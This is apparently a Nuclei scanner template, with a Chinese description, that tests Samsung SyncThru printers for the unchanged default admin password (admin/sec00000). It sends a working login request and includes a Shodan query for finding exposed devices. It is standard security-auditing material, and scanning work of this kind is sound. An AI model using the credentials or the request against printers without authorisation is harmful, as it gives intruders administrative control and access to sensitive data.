id: samsung-printer-default-login

info:
  name: Samsung Printer 默认口令登录（弱口令）
  author: gy741
  severity: high
  description: |
    该模板通过尝试 Samsung Printer 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://support.hp.com/gb-en/document/c05591673
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:h:samsung:scx-6555n:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"SyncThru Web Service"
    product: scx-6555n
    vendor: samsung
  tags: default-login,iot,samsung,printer,intrusive,vuln

http:
  - raw:
      - |
        POST /sws/app/gnb/login/login.jsp HTTP/1.1
        Host: {{Hostname}}

        Authentication=Basic {{base64(username + ':' + password)}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - sec00000

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "success: true"
          - "passwordExpiration"
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
